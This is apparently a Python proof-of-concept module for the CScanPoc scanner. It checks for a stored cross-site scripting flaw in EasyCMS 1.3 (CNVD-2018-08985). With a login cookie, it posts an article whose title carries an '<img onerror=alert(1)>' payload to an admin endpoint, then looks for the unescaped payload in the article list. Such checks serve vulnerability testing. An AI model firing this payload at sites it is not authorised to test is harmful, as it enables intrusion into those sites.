# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EasyCMS_0007_L'  # 平台漏洞编号
    name = 'EasyCMS跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-05-07'  # 漏洞公布时间
    desc = '''
    EasyCMS 1.3版本中存在跨站脚本漏洞。远程攻击者可借助title、keyword、abstract和content字段利用该漏洞注入任意的Web脚本或HTML。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08985'
    cnvd_id = 'CNVD-2018-08985'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EasyCMS'  # 漏洞组件名称
    product_version = '1.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a10ad200-9155-4cf9-a2d7-e35348dd692e'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': '',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 构造xss payload
            self.output.info('正在构造xss payload')
            payload1 = "/index.php?s=/admin/articlem/insert/navTabId/listarticle/callbackType/closeCurrent"
            data = '''tid=&title=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E&keyword=cscanpoc&ispush=0&iscommend=1&isslides=0&islock=0&summary=cscanpoc&content=%09%09%09%09%09cscanpoc'''
            vul_url1 = arg + payload1
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': self.get_option('cookie')
            }
            response1 = requests.post(vul_url1, headers=headers, data=data)

            # 验证xss是否成功触发
            self.output.info('验证xss是否成功触发')
            payload2 = "/index.php?s=/admin/articlem/index.html&_=1532271572256"
            vul_url2 = arg + payload2
            response2 = requests.get(vul_url2, headers=headers)
            if response2.status_code == 200 and '<td><img src=x onerror=alert(1)></td>' in response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
